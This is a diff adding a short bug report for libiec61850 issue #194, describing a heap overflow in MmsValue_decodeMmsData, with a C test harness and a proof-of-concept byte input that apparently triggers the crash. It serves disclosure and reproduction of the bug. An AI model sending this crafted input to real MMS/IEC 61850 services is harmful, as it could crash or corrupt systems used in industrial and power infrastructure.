@@ -1,0 +1,26 @@
+issue #194
+
+Function MmsValue_decodeMmsData has heap overflow vulnerability in file mms/iso_mms/server/mms_access_result.c.
+
+test.c
+
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <libiec61850/mms_value.h>
+uint8_t globalbuf[0x10000];
+int main(){
+    ssize_t readcount;
+    readcount = read(0, globalbuf, sizeof(globalbuf));
+    if( readcount <= 0 ){
+        return 0;
+    }
+    MmsValue *res = MmsValue_decodeMmsData(globalbuf, 0, (int)readcount, 0);
+    return 0;
+}
+
+PoC
+
+<a2><16><a2><00><86><12><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00>
+
+
